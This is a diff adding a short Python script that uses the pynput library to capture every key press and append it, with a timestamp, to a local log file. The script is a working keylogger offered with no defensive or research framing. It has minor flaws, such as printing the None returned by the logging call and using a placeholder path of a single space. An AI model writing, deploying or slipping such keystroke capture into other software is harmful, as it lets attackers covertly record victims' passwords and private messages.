@@ -1,0 +1,15 @@
+#pip install pynput
+
+from pynput.keyboard import Key, Listener
+import logging 
+
+# add the path where you want to add a new file in path 
+path = " "
+logging.basicConfig(filename = (f"{path}/logfile.txt"), \
+    level=logging.DEBUG, format='%(asctime)s: "message typed" : %(message)s')
+
+def keypress(Key):
+    print(logging.info(str(Key)))
+
+with Listener(on_press = keypress) as listener:
+    listener.join()
